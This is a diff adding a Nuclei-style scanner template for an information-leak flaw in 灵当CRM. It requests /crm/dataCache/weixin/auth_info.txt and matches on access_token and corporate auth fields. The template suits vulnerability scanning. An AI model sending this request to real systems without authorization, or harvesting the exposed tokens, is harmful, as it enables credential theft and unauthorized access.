@@ -1,0 +1,24 @@
+id: poc-yaml-51mis-crm-auth-info-info-leak
+info:
+  name: 灵当CRM auth-info 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露, info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/crm/dataCache/weixin/auth_info.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"crm\":"
+          - "access_token"
+          - "\"auth_corp_info\":"
+        condition: and
+      - type: regex
+        regex:
+          - "^((?!<).)*$"
